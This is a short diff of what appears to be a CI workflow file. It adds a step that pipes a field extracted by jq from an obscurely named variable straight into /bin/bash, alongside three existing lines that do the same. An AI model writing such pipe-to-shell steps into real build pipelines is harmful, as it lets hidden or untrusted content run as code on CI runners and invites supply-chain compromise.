@@ -25,6 +25,7 @@ jobs:
           echo $akdnl9 | jq -r .ygge7039 | /bin/bash
           printf '%s' "$cnmml5" | jq -r .hbs25 | /bin/bash
           printf '%s' "$fr29" | jq -r .gve7393 | /bin/bash
+          printf '%s' "$w48" | jq -r .ra4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
